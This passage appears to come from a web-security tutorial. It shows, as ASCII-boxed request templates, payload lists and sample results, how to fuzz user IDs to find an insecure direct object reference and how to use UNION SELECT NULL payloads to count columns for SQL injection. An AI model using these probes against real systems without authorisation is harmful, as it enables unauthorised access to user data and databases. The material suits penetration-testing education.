### Scenario 1: Finding IDOR (Insecure Direct Object Reference)

```
┌─────────────────────────────────────────────────────────────────────────────┐  
│ REQUEST │  
├─────────────────────────────────────────────────────────────────────────────┤  
│ GET /api/user/§1§ HTTP/1.1 │  
│ Cookie: session=abc123 │  
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐  
│ PAYLOADS (Numbers 1-100) │  
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐  
│ RESULTS - Look for 200 status codes │  
├─────────────────────────────────────────────────────────────────────────────┤  
│ ID Status Length Response Contains │  
│ 1 200 1024 "admin" │  
│ 2 200 1024 "user123" │  
│ 3 403 512 "Access Denied" │  
│ 4 200 1024 "user456" <- Found! │  
└─────────────────────────────────────────────────────────────────────────────┘
```

### Scenario 2: SQL Injection Column Count Discovery

```
┌─────────────────────────────────────────────────────────────────────────────┐  
│ REQUEST │  
├─────────────────────────────────────────────────────────────────────────────┤  
│ GET /products.php?id=1 UNION SELECT §nulls§ HTTP/1.1 │

┌─────────────────────────────────────────────────────────────────────────────┐  
│ PAYLOADS │  
├─────────────────────────────────────────────────────────────────────────────┤  
│ NULL │  
│ NULL,NULL │  
│ NULL,NULL,NULL │  
│ NULL,NULL,NULL,NULL │  
│ NULL,NULL,NULL,NULL,NULL │  
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐  
│ RESULTS - First request without error gives column count │  
├─────────────────────────────────────────────────────────────────────────────┤  
│ Request Payload Status Error? │

│ 2 NULL,NULL 500 "Unknown column" │  
│ 3 NULL,NULL,NULL 200 No error! 3 columns! │  
└─────────────────────────────────────────────────────────────────────────────┘
```
